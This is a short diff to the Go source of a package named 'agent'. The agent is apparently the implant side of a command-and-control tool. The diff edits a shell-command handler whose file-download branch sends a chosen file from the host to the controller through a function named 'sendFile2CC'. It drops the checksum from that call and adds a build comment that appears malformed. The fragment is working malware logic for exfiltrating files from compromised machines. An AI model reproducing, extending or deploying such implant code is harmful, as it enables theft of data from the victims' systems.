@@ -1,5 +1,7 @@
 package agent
 
+// build +linux
+
 import (
 	"encoding/json"
 	"fmt"
@@ -44,8 +46,8 @@ func shellHelper(cmdSlice []string) (out string) {
 		}
 		token := args[2]
 		log.Printf("File download: %s at %d with token %s", filepath, offset, token)
-		checksum, err := sendFile2CC(filepath, offset, token)
-		out = fmt.Sprintf("%s (%s) has been sent, please check", filepath, checksum)
+		err = sendFile2CC(filepath, offset, token)
+		out = fmt.Sprintf("%s has been sent, please check", filepath)
 		if err != nil {
 			log.Printf("#GET: %v", err)
 			out = filepath + err.Error()
